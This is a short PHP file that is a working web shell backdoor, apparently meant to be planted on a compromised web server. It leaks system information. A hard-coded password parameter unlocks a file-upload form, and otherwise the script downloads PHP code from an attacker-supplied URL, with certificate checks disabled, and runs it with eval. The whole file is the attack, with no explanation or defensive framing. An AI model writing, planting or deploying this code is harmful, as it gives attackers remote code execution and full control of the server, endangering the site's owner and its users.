<?php error_reporting(0); echo php_uname()."<br>".getcwd()."<br>"; if($_GET['FOx'] == 'pDVhK'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } $code = "http://".$_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } ?>